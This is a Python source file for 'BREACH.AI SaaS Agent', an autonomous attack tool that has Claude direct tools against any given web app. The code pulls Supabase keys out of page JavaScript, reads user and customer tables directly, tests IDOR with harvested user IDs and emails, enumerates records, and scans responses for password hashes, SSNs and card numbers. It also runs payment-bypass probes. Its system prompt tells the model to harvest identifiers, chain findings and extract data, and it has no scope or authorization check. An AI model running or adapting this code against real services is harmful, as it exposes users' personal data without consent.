#!/usr/bin/env python3
"""
BREACH.AI SAAS AGENT
====================

Works on ANY vibe-coded app. Discovers patterns. Adapts attacks.

NOT hardcoded for one target. LEARNS each target.

The agent:
1. DISCOVERS what the target has (stack, endpoints, patterns)
2. LEARNS how THIS specific app works
3. ATTACKS based on what it discovered
4. CHAINS findings to go deeper
5. EXTRACTS data as proof
"""

import asyncio
import aiohttp
import json
import os
import re
from dataclasses import dataclass, field
from typing import Optional, List, Dict, Any, Set, Callable
from urllib.parse import urlparse, urljoin
from datetime import datetime

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich import box

console = Console()

ANTHROPIC_API_KEY = os.environ.get('ANTHROPIC_API_KEY', '')
ANTHROPIC_MODEL = "claude-sonnet-4-20250514"
MAX_ITERATIONS = 40


# ============================================================================
# DYNAMIC KNOWLEDGE BASE - LEARNED PER TARGET
# ============================================================================

@dataclass
class TargetKnowledge:
    """What we've learned about THIS specific target."""
    # Stack detection
    framework: Optional[str] = None  # Next.js, React, Vue, etc.
    database: Optional[str] = None   # Supabase, Firebase, MongoDB, etc.
    auth_provider: Optional[str] = None  # Clerk, Auth0, custom

    # Discovered credentials
    supabase_url: Optional[str] = None
    supabase_key: Optional[str] = None
    firebase_config: Optional[dict] = None

    # Learned patterns
    id_format: Optional[str] = None  # mongodb, uuid, numeric
    api_prefix: Optional[str] = None  # /api, /v1, etc.

    # Discovered endpoints
    endpoints: List[str] = field(default_factory=list)
    sensitive_endpoints: List[str] = field(default_factory=list)

    # Harvested data
    user_ids: Set[str] = field(default_factory=set)
    emails: Set[str] = field(default_factory=set)


@dataclass
class AgentState:
    """Full agent state."""
    target: str
    cookies: Dict[str, str] = field(default_factory=dict)

    # Dynamic knowledge about target
    knowledge: TargetKnowledge = field(default_factory=TargetKnowledge)

    # Findings
    findings: List[dict] = field(default_factory=list)

    # Last response for analysis
    last_response: Dict = field(default_factory=dict)
    last_response_body: str = ""

    # Stats
    requests_made: int = 0
    iteration: int = 0


# ============================================================================
# TOOLS - GENERIC, DISCOVERY-FOCUSED
# ============================================================================

TOOLS = [
    {
        "name": "discover_stack",
        "description": "Discover what tech stack the target uses (Next.js, Supabase, Firebase, etc.). ALWAYS call this first.",
        "input_schema": {
            "type": "object",
            "properties": {}
        }
    },
    {
        "name": "discover_endpoints",
        "description": "Discover API endpoints by crawling/probing. Use after discovering stack.",
        "input_schema": {
            "type": "object",
            "properties": {
                "strategy": {
                    "type": "string",
                    "enum": ["common", "crawl", "js_analysis"],
                    "description": "How to discover endpoints"
                }
            }
        }
    },
    {
        "name": "probe_endpoint",
        "description": "Probe a specific endpoint to understand its behavior.",
        "input_schema": {
            "type": "object",
            "properties": {
                "path": {"type": "string", "description": "Endpoint path"},
                "method": {"type": "string", "default": "GET"},
                "body": {"type": "object"}
            },
            "required": ["path"]
        }
    },
    {
        "name": "extract_identifiers",
        "description": "Extract user IDs, emails, keys from the last response.",
        "input_schema": {
            "type": "object",
            "properties": {}
        }
    },
    {
        "name": "test_idor",
        "description": "Test IDOR on an endpoint using discovered IDs.",
        "input_schema": {
            "type": "object",
            "properties": {
                "endpoint_pattern": {
                    "type": "string",
                    "description": "Pattern like /api/user/{id}"
                }
            },
            "required": ["endpoint_pattern"]
        }
    },
    {
        "name": "test_supabase",
        "description": "Test Supabase-specific vulnerabilities (RLS bypass, direct table access).",
        "input_schema": {
            "type": "object",
            "properties": {
                "action": {
                    "type": "string",
                    "enum": ["list_tables", "read_users", "bypass_rls", "test_auth"],
                    "description": "What to test"
                }
            }
        }
    },
    {
        "name": "test_firebase",
        "description": "Test Firebase-specific vulnerabilities (public rules, auth bypass).",
        "input_schema": {
            "type": "object",
            "properties": {
                "action": {
                    "type": "string",
                    "enum": ["check_rules", "read_users", "test_auth"],
                    "description": "What to test"
                }
            }
        }
    },
    {
        "name": "test_graphql",
        "description": "Test GraphQL-specific vulnerabilities (introspection, batching, injection).",
        "input_schema": {
            "type": "object",
            "properties": {
                "action": {
                    "type": "string",
                    "enum": ["introspect", "batch_query", "test_injection"],
                    "description": "What to test"
                }
            }
        }
    },
    {
        "name": "test_payment_bypass",
        "description": "Test for payment/subscription bypass vulnerabilities.",
        "input_schema": {
            "type": "object",
            "properties": {
                "action": {
                    "type": "string",
                    "enum": ["check_premium_endpoints", "test_trial_abuse", "test_price_manipulation"]
                }
            }
        }
    },
    {
        "name": "analyze_sensitive_data",
        "description": "Analyze response for passwords, PII, secrets.",
        "input_schema": {
            "type": "object",
            "properties": {}
        }
    },
    {
        "name": "report_finding",
        "description": "Report a confirmed vulnerability.",
        "input_schema": {
            "type": "object",
            "properties": {
                "severity": {"type": "string", "enum": ["critical", "high", "medium", "low"]},
                "title": {"type": "string"},
                "description": {"type": "string"},
                "data_exposed": {"type": "array", "items": {"type": "string"}},
                "proof": {"type": "string"}
            },
            "required": ["severity", "title", "description"]
        }
    },
    {
        "name": "enumerate_records",
        "description": "Enumerate all accessible records through a vulnerable endpoint.",
        "input_schema": {
            "type": "object",
            "properties": {
                "endpoint_pattern": {"type": "string"},
                "id_range": {"type": "string", "description": "Range like 1-1000 or 'all'"}
            },
            "required": ["endpoint_pattern"]
        }
    },
    {
        "name": "done",
        "description": "Mark assessment complete.",
        "input_schema": {
            "type": "object",
            "properties": {
                "summary": {"type": "string"}
            }
        }
    }
]


# ============================================================================
# SYSTEM PROMPT - DISCOVERY-FIRST METHODOLOGY
# ============================================================================

SYSTEM_PROMPT = """You are BREACH.AI SaaS Agent - designed to work on ANY modern web app.

YOUR METHODOLOGY:

1. DISCOVER FIRST (ALWAYS START HERE)
   - Call discover_stack to identify what the target uses
   - Look for: Supabase, Firebase, Vercel, Next.js, React, Vue
   - Extract any exposed API keys or config

2. ADAPT TO WHAT YOU FIND
   - Supabase app? -> test_supabase for RLS bypass
   - Firebase app? -> test_firebase for public rules
   - GraphQL endpoint? -> test_graphql for introspection
   - REST API? -> discover_endpoints then test_idor

3. HARVEST IDENTIFIERS
   - Extract user IDs, emails, keys from every response
   - Use extract_identifiers after each successful probe
   - More IDs = more attack surface

4. TEST SYSTEMATICALLY
   - IDOR: Try accessing /api/user/{harvested_id}
   - Auth bypass: Try endpoints without auth
   - Data exposure: Check what's returned

5. CHAIN YOUR FINDINGS
   - Found user emails? -> Try password reset abuse
   - Found Supabase key? -> Try direct database access
   - Found one IDOR? -> Test similar endpoints

6. PROVE AND REPORT
   - Use report_finding for each confirmed issue
   - Include proof (endpoint, sample data, record count)
   - Estimate total exposure

REMEMBER:
- Every app is different. DISCOVER before attacking.
- Modern apps often leak Supabase/Firebase config in JS
- IDOR is everywhere in vibe-coded apps
- Public endpoints often expose IDs for private data

You have access to current knowledge about the target. Use it to make smart decisions."""


# ============================================================================
# SAAS BREACH AGENT
# ============================================================================

class SaaSBreachAgent:
    """Generic SaaS agent that discovers and adapts."""

    def __init__(
        self,
        target: str,
        cookie: Optional[str] = None,
        on_finding: Optional[Callable[[dict], None]] = None,
        on_progress: Optional[Callable[[int, str], None]] = None
    ):
        self.state = AgentState(target=target)
        if cookie:
            self.state.cookies = self._parse_cookie(cookie)

        # Dashboard callbacks
        self.on_finding = on_finding
        self.on_progress = on_progress

        self.session: Optional[aiohttp.ClientSession] = None

    def _parse_cookie(self, cookie: str) -> Dict[str, str]:
        """Parse cookie string into dict."""
        cookies = {}
        for part in cookie.split(';'):
            if '=' in part:
                key, value = part.strip().split('=', 1)
                cookies[key] = value
        return cookies

    async def run(self) -> Dict[str, Any]:
        """Run the autonomous assessment."""
        console.print(Panel(
            f"[bold cyan]BREACH.AI SAAS AGENT[/bold cyan]\n"
            f"Target: {self.state.target}\n"
            f"Mode: Discovery-First Autonomous Assessment",
            title="Starting"
        ))

        start_time = asyncio.get_event_loop().time()

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json, text/plain, */*",
        }

        if self.state.cookies:
            headers["Cookie"] = "; ".join(f"{k}={v}" for k, v in self.state.cookies.items())

        async with aiohttp.ClientSession(headers=headers) as session:
            self.session = session

            while self.state.iteration < MAX_ITERATIONS:
                self.state.iteration += 1

                if self.on_progress:
                    progress = int((self.state.iteration / MAX_ITERATIONS) * 100)
                    self.on_progress(progress, f"Iteration {self.state.iteration}")

                console.print(f"\n[bold cyan]═══ ITERATION {self.state.iteration} ═══[/bold cyan]")

                response = await self._call_claude()
                if not response:
                    break

                done = await self._process_response(response)
                if done:
                    break

            self.session = None

        duration = asyncio.get_event_loop().time() - start_time
        self._print_report(duration)

        return {
            "target": self.state.target,
            "knowledge": {
                "framework": self.state.knowledge.framework,
                "database": self.state.knowledge.database,
                "supabase_url": self.state.knowledge.supabase_url,
                "endpoints_found": len(self.state.knowledge.endpoints),
                "ids_harvested": len(self.state.knowledge.user_ids)
            },
            "findings": self.state.findings,
            "requests_made": self.state.requests_made,
            "duration": duration
        }

    async def _call_claude(self) -> Optional[dict]:
        """Call Claude with current context and knowledge."""
        if not ANTHROPIC_API_KEY:
            console.print("[red]Error: ANTHROPIC_API_KEY not set[/red]")
            return None

        knowledge = self.state.knowledge
        context = f"""TARGET KNOWLEDGE:
- URL: {self.state.target}
- Framework: {knowledge.framework or 'Unknown (discover it!)'}
- Database: {knowledge.database or 'Unknown (discover it!)'}
- Supabase URL: {knowledge.supabase_url or 'Not found'}
- Supabase Key: {'Found' if knowledge.supabase_key else 'Not found'}
- ID Format: {knowledge.id_format or 'Unknown'}
- Endpoints Found: {len(knowledge.endpoints)}
- User IDs Harvested: {len(knowledge.user_ids)}
- Emails Found: {len(knowledge.emails)}

FINDINGS SO FAR: {len(self.state.findings)}

LAST RESPONSE: {self.state.last_response.get('summary', 'None yet')}

What should we do next? Remember: DISCOVER before attacking."""

        try:
            async with aiohttp.ClientSession() as api_session:
                async with api_session.post(
                    "https://api.anthropic.com/v1/messages",
                    headers={
                        "x-api-key": ANTHROPIC_API_KEY,
                        "anthropic-version": "2023-06-01",
                        "content-type": "application/json"
                    },
                    json={
                        "model": ANTHROPIC_MODEL,
                        "max_tokens": 1024,
                        "system": SYSTEM_PROMPT,
                        "tools": TOOLS,
                        "messages": [{"role": "user", "content": context}]
                    }
                ) as resp:
                    if resp.status != 200:
                        error = await resp.text()
                        console.print(f"[red]API Error: {error}[/red]")
                        return None
                    return await resp.json()
        except Exception as e:
            console.print(f"[red]Error: {e}[/red]")
            return None

    async def _process_response(self, response: dict) -> bool:
        """Process Claude's response."""
        done = False

        for block in response.get("content", []):
            if block.get("type") == "text":
                console.print(f"[dim]{block.get('text', '')}[/dim]")

            elif block.get("type") == "tool_use":
                tool_name = block.get("name")
                tool_input = block.get("input", {})

                console.print(f"\n[yellow]→ {tool_name}[/yellow]", end=" ")
                if tool_input:
                    console.print(f"[dim]{json.dumps(tool_input, default=str)[:100]}[/dim]")

                result = await self._execute_tool(tool_name, tool_input)

                if tool_name == "done":
                    done = True

        return done

    async def _execute_tool(self, tool_name: str, tool_input: dict) -> dict:
        """Route tool execution."""
        handlers = {
            "discover_stack": self._discover_stack,
            "discover_endpoints": self._discover_endpoints,
            "probe_endpoint": self._probe_endpoint,
            "extract_identifiers": self._extract_identifiers,
            "test_idor": self._test_idor,
            "test_supabase": self._test_supabase,
            "test_firebase": self._test_firebase,
            "test_graphql": self._test_graphql,
            "test_payment_bypass": self._test_payment_bypass,
            "analyze_sensitive_data": self._analyze_sensitive_data,
            "report_finding": self._report_finding,
            "enumerate_records": self._enumerate_records,
            "done": lambda x: {"status": "complete", "summary": x.get("summary", "")}
        }

        handler = handlers.get(tool_name)
        if handler:
            if asyncio.iscoroutinefunction(handler):
                return await handler(tool_input)
            return handler(tool_input)
        return {"error": f"Unknown tool: {tool_name}"}

    async def _discover_stack(self, input: dict) -> dict:
        """Discover target's tech stack."""
        console.print("\n[cyan]Discovering tech stack...[/cyan]")

        knowledge = self.state.knowledge

        # Fetch main page
        try:
            async with self.session.get(self.state.target, ssl=False) as resp:
                body = await resp.text()
                self.state.requests_made += 1

                # Detect framework
                if "_next" in body or "__NEXT_DATA__" in body:
                    knowledge.framework = "Next.js"
                elif "/_nuxt/" in body:
                    knowledge.framework = "Nuxt.js"
                elif "ng-app" in body or "ng-controller" in body:
                    knowledge.framework = "Angular"
                elif "data-v-" in body:
                    knowledge.framework = "Vue.js"

                # Detect Supabase
                supabase_match = re.search(r'https://([a-z0-9]+)\.supabase\.co', body)
                if supabase_match:
                    knowledge.database = "Supabase"
                    knowledge.supabase_url = f"https://{supabase_match.group(1)}.supabase.co"

                # Extract Supabase key
                key_match = re.search(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+', body)
                if key_match:
                    knowledge.supabase_key = key_match.group(0)

                # Detect Firebase
                firebase_match = re.search(r'firebaseConfig\s*=\s*\{([^}]+)\}', body)
                if firebase_match:
                    knowledge.database = "Firebase"

                # Check for GraphQL
                if "/graphql" in body or "apollo" in body.lower():
                    knowledge.endpoints.append("/graphql")

        except Exception as e:
            console.print(f"[red]Error: {e}[/red]")

        console.print(f"  Framework: {knowledge.framework or 'Unknown'}")
        console.print(f"  Database: {knowledge.database or 'Unknown'}")
        if knowledge.supabase_url:
            console.print(f"  Supabase: {knowledge.supabase_url}")
            console.print(f"  API Key: {'[green]FOUND[/green]' if knowledge.supabase_key else '[yellow]Not found[/yellow]'}")

        return {
            "framework": knowledge.framework,
            "database": knowledge.database,
            "supabase_url": knowledge.supabase_url,
            "has_supabase_key": bool(knowledge.supabase_key)
        }

    async def _discover_endpoints(self, input: dict) -> dict:
        """Discover API endpoints."""
        strategy = input.get("strategy", "common")
        knowledge = self.state.knowledge
        found = []

        common_endpoints = [
            "/api/users", "/api/user", "/api/profile", "/api/profiles",
            "/api/posts", "/api/comments", "/api/products", "/api/orders",
            "/api/auth/user", "/api/me", "/api/account", "/api/settings",
            "/api/admin", "/api/dashboard", "/api/stats",
            "/graphql", "/api/graphql",
        ]

        for endpoint in common_endpoints:
            url = urljoin(self.state.target, endpoint)
            try:
                async with self.session.get(url, ssl=False) as resp:
                    self.state.requests_made += 1
                    if resp.status in [200, 401, 403]:
                        found.append({"path": endpoint, "status": resp.status})
                        knowledge.endpoints.append(endpoint)
                        status_color = "green" if resp.status == 200 else "yellow"
                        console.print(f"  [{status_color}]{resp.status}[/{status_color}] {endpoint}")
            except:
                pass

        return {"endpoints_found": len(found), "endpoints": found}

    async def _probe_endpoint(self, input: dict) -> dict:
        """Probe a specific endpoint."""
        path = input.get("path", "")
        method = input.get("method", "GET")
        body = input.get("body")

        url = urljoin(self.state.target, path)
        self.state.requests_made += 1

        try:
            kwargs = {"ssl": False}
            if body:
                kwargs["json"] = body

            async with self.session.request(method, url, **kwargs) as resp:
                response_body = await resp.text()

                self.state.last_response = {
                    "url": url,
                    "status": resp.status,
                    "summary": f"{resp.status} - {len(response_body)} bytes"
                }
                self.state.last_response_body = response_body

                # Auto-extract IDs
                self._extract_ids(response_body)

                console.print(f"  [{resp.status}] {len(response_body)} bytes")

                return {
                    "status": resp.status,
                    "body_preview": response_body[:500],
                    "length": len(response_body)
                }
        except Exception as e:
            return {"error": str(e)}

    def _extract_identifiers(self, input: dict) -> dict:
        """Extract IDs from last response."""
        body = self.state.last_response_body
        self._extract_ids(body)

        return {
            "user_ids": len(self.state.knowledge.user_ids),
            "emails": len(self.state.knowledge.emails),
            "sample_ids": list(self.state.knowledge.user_ids)[:10]
        }

    def _extract_ids(self, text: str):
        """Extract all IDs from text."""
        knowledge = self.state.knowledge

        # MongoDB ObjectIDs
        mongo_ids = re.findall(r'\b[a-f0-9]{24}\b', text, re.IGNORECASE)
        if mongo_ids:
            knowledge.id_format = "mongodb"
            knowledge.user_ids.update(mongo_ids)

        # UUIDs
        uuids = re.findall(r'\b[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}\b', text, re.IGNORECASE)
        if uuids:
            knowledge.id_format = "uuid"
            knowledge.user_ids.update(uuids)

        # Numeric IDs
        numeric = re.findall(r'"(?:id|user_id|userId)":\s*(\d+)', text)
        knowledge.user_ids.update(numeric)

        # Emails
        emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', text)
        knowledge.emails.update(emails)

    async def _test_idor(self, input: dict) -> dict:
        """Test IDOR on endpoint pattern."""
        pattern = input.get("endpoint_pattern", "/api/user/{id}")
        ids = list(self.state.knowledge.user_ids)[:10]

        if not ids:
            return {"error": "No IDs harvested yet. Discover endpoints first."}

        vulnerable = []
        for id in ids:
            path = pattern.replace("{id}", str(id))
            url = urljoin(self.state.target, path)
            self.state.requests_made += 1

            try:
                async with self.session.get(url, ssl=False) as resp:
                    if resp.status == 200:
                        body = await resp.text()
                        if len(body) > 100 and self._has_sensitive_data(body):
                            vulnerable.append({"id": id, "path": path})
                            console.print(f"  [red]🔴 VULNERABLE[/red] {path}")
            except:
                pass

        return {
            "tested": len(ids),
            "vulnerable_count": len(vulnerable),
            "vulnerable_endpoints": vulnerable
        }

    async def _test_supabase(self, input: dict) -> dict:
        """Test Supabase-specific vulnerabilities."""
        action = input.get("action", "list_tables")
        knowledge = self.state.knowledge

        if not knowledge.supabase_url or not knowledge.supabase_key:
            return {"error": "Supabase credentials not discovered yet"}

        headers = {
            "apikey": knowledge.supabase_key,
            "Authorization": f"Bearer {knowledge.supabase_key}"
        }

        if action == "list_tables":
            # Try to list all tables via REST
            url = f"{knowledge.supabase_url}/rest/v1/"
            try:
                async with self.session.get(url, headers=headers, ssl=False) as resp:
                    self.state.requests_made += 1
                    if resp.status == 200:
                        body = await resp.text()
                        return {"status": "accessible", "response": body[:500]}
            except:
                pass

        elif action == "read_users":
            # Try common user table names
            tables = ["users", "profiles", "accounts", "members", "customers"]
            for table in tables:
                url = f"{knowledge.supabase_url}/rest/v1/{table}?select=*"
                try:
                    async with self.session.get(url, headers=headers, ssl=False) as resp:
                        self.state.requests_made += 1
                        if resp.status == 200:
                            body = await resp.text()
                            if len(body) > 10:
                                self.state.last_response_body = body
                                console.print(f"  [red]🔴 Table '{table}' accessible![/red]")
                                return {
                                    "vulnerable": True,
                                    "table": table,
                                    "preview": body[:500]
                                }
                except:
                    pass

        return {"status": "tested", "action": action}

    async def _test_firebase(self, input: dict) -> dict:
        """Test Firebase vulnerabilities."""
        # Simplified - would need Firebase config
        return {"status": "not_implemented", "reason": "Firebase config not discovered"}

    async def _test_graphql(self, input: dict) -> dict:
        """Test GraphQL vulnerabilities."""
        action = input.get("action", "introspect")

        graphql_endpoints = ["/graphql", "/api/graphql", "/gql"]

        for endpoint in graphql_endpoints:
            url = urljoin(self.state.target, endpoint)

            if action == "introspect":
                query = {"query": "{ __schema { types { name } } }"}
                try:
                    async with self.session.post(url, json=query, ssl=False) as resp:
                        self.state.requests_made += 1
                        if resp.status == 200:
                            body = await resp.text()
                            if "__schema" in body:
                                console.print(f"  [yellow]⚠ Introspection enabled at {endpoint}[/yellow]")
                                return {"vulnerable": True, "endpoint": endpoint, "type": "introspection"}
                except:
                    pass

        return {"status": "tested", "vulnerable": False}

    async def _test_payment_bypass(self, input: dict) -> dict:
        """Test payment bypass vulnerabilities."""
        action = input.get("action", "check_premium_endpoints")

        premium_endpoints = [
            "/api/premium", "/api/pro", "/api/subscription",
            "/api/billing", "/api/plan", "/api/upgrade"
        ]

        accessible = []
        for endpoint in premium_endpoints:
            url = urljoin(self.state.target, endpoint)
            try:
                async with self.session.get(url, ssl=False) as resp:
                    self.state.requests_made += 1
                    if resp.status == 200:
                        accessible.append(endpoint)
            except:
                pass

        return {"premium_endpoints_accessible": accessible}

    def _analyze_sensitive_data(self, input: dict) -> dict:
        """Analyze response for sensitive data."""
        body = self.state.last_response_body

        patterns = {
            "password_hash": r'"(password|hash|password_hash)":\s*"[^"]{20,}"',
            "email": r'"email":\s*"[^"]+"',
            "phone": r'"(phone|mobile)":\s*"[^"]+"',
            "ssn": r'"ssn":\s*"\d{3}-?\d{2}-?\d{4}"',
            "credit_card": r'"(card|cc_number)":\s*"\d{13,19}"',
        }

        found = {}
        for name, pattern in patterns.items():
            matches = re.findall(pattern, body, re.IGNORECASE)
            if matches:
                found[name] = len(matches)

        return {"sensitive_data": found}

    def _has_sensitive_data(self, body: str) -> bool:
        """Quick check for sensitive data."""
        sensitive_keywords = [
            "password", "hash", "email", "phone", "ssn", "card",
            "secret", "token", "api_key", "private"
        ]
        body_lower = body.lower()
        return any(kw in body_lower for kw in sensitive_keywords)

    def _report_finding(self, input: dict) -> dict:
        """Report a vulnerability finding."""
        finding = {
            "severity": input.get("severity"),
            "title": input.get("title"),
            "description": input.get("description"),
            "data_exposed": input.get("data_exposed", []),
            "proof": input.get("proof"),
            "timestamp": datetime.now().isoformat()
        }

        self.state.findings.append(finding)

        # Notify dashboard
        if self.on_finding:
            self.on_finding(finding)

        console.print(f"\n[bold red]🔴 FINDING: {finding['title']}[/bold red]")
        console.print(f"[red]   Severity: {finding['severity']}[/red]")

        return {"recorded": True, "total_findings": len(self.state.findings)}

    async def _enumerate_records(self, input: dict) -> dict:
        """Enumerate records through vulnerable endpoint."""
        pattern = input.get("endpoint_pattern", "")
        sample_ids = list(self.state.knowledge.user_ids)[:20]

        if not sample_ids:
            return {"error": "No IDs to enumerate"}

        accessible = 0
        for id in sample_ids:
            path = pattern.replace("{id}", str(id))
            url = urljoin(self.state.target, path)
            try:
                async with self.session.get(url, ssl=False) as resp:
                    if resp.status == 200:
                        body = await resp.text()
                        if len(body) > 50:
                            accessible += 1
            except:
                pass

        return {
            "tested": len(sample_ids),
            "accessible": accessible,
            "estimated_total": f"{accessible}/{len(sample_ids)} tested IDs accessible"
        }

    def _print_report(self, duration: float):
        """Print final report."""
        console.print(f"\n{'═' * 60}")
        console.print("[bold]SAAS ASSESSMENT COMPLETE[/bold]")
        console.print(f"{'═' * 60}")

        table = Table(box=box.ROUNDED)
        table.add_column("Metric", style="cyan")
        table.add_column("Value")

        k = self.state.knowledge
        table.add_row("Target", self.state.target)
        table.add_row("Framework", k.framework or "Unknown")
        table.add_row("Database", k.database or "Unknown")
        table.add_row("Duration", f"{duration:.1f}s")
        table.add_row("Requests", str(self.state.requests_made))
        table.add_row("Endpoints Found", str(len(k.endpoints)))
        table.add_row("IDs Harvested", str(len(k.user_ids)))
        table.add_row("Findings", f"[red]{len(self.state.findings)}[/red]" if self.state.findings else "0")

        console.print(table)

        if self.state.findings:
            console.print("\n[bold red]VULNERABILITIES:[/bold red]")
            for f in self.state.findings:
                console.print(f"\n  [{f['severity'].upper()}] {f['title']}")
                console.print(f"  {f['description']}")

        console.print(f"\n{'═' * 60}\n")


# ============================================================================
# CLI
# ============================================================================

async def main():
    import argparse

    parser = argparse.ArgumentParser(description='BREACH.AI SaaS Agent')
    parser.add_argument('target', help='Target URL')
    parser.add_argument('--cookie', help='Session cookie')

    args = parser.parse_args()

    agent = SaaSBreachAgent(args.target, args.cookie)
    await agent.run()


if __name__ == '__main__':
    asyncio.run(main())
